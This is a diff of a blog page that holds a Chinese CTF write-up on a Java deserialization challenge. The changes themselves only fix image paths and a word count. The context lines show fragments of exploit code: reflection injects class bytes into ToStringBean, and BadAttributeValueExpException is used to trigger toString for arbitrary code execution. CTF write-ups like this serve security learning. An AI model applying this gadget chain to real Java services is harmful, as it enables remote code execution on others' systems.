@@ -328,9 +328,9 @@
             <div id="articleContent">
                 <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目是一个jar包</p>
 <p>其中<code>ToStringBean</code>类下调用了defineclass和newInstance方法.跟之前的CC3一样造成任意代码执行</p>
-<p><img src="/%5Cimages%5Cposts%5C%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5Cimage-20240927201628256.png"></p>
+<p><img src="/images/posts/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240927201628256.png"></p>
 <p>而在之前的CC5中<code>BadAttributeValueExpException</code>调用了<code>toString</code>方法</p>
-<p><img src="/%5Cimages%5Cposts%5C%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5Cimage-20240927202653895.png"></p>
+<p><img src="/images/posts/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240927202653895.png"></p>
 <p>所以链子为<code>BadAttributeValueExpException</code>-&gt;<code>toString</code></p>
 <h1 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h1><p>先通过反射修改<code>ClassByte</code>的值</p>
 <pre class="language-Java" data-language="Java"><code class="language-Java">ToStringBean toStringBean &#x3D; new ToStringBean();
@@ -341,7 +341,7 @@ byte[] bytes &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLo
 declaredField.set(toStringBean,bytes);</code></pre>
 
 <p>再用<code>BadAttributeValueExpException</code>来调用<code>toString</code></p>
-<p><img src="/%5Cimages%5Cposts%5C%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5Cimage-20240927203732634.png"></p>
+<p><img src="/images/posts/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadgetJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240927203732634.png"></p>
 <p>这里是调用<code>toString</code>后将结果赋值给了val,然后<code>readObject</code>调用val的<code>toString</code>.所以这里随便传一个值在后面在反射修改回来</p>
 <pre class="language-Java" data-language="Java"><code class="language-Java">BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(113);&#x2F;&#x2F;随便传
 
@@ -778,7 +778,7 @@ public class EXP &#123;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">50k</span>
+                        class="white-color">50.3k</span>
             
             
             
